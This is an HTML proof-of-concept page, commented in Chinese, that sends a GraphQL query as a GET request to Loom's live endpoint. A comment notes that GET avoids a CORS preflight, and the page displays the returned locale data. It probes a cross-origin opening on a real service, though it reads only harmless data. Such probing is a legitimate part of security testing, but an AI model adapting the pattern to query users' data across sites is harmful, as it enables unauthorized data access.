<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loom GraphQL GET PoC</title>
</head>
<body>
  <h1>Loom GraphQL GET PoC</h1>
  <p>打开浏览器 Console，查看返回的 JSON 数据。</p>
  <script>
    // 构造一个 GET 请求 URL，将所有参数都放在查询字符串里
    const query = [
      'query AtlassianLocaleResponse {',
      '  atlassianLocaleResponse {',
      '    localeRequiresMarketingOptIn',
      '    locale',
      '    __typename',
      '  }',
      '  __typename',
      '}'
    ].join(' ');
    const params = new URLSearchParams({
      operationName: "AtlassianLocaleResponse",
      variables: "{}",          // 空对象
      query: query
    });
    const url = "https://www.loom.com/graphql?" + params.toString();

    // GET 是简单请求，不会触发 CORS 预检
    fetch(url)
      .then(res => res.json())
      .then(data => {
        console.log("✅ GET PoC fetched:", data);
        const pre = document.createElement("pre");
        pre.textContent = JSON.stringify(data, null, 2);
        document.body.appendChild(pre);
      })
      .catch(err => {
        console.error("❌ PoC fetch failed:", err);
      });
  </script>
</body>
</html>
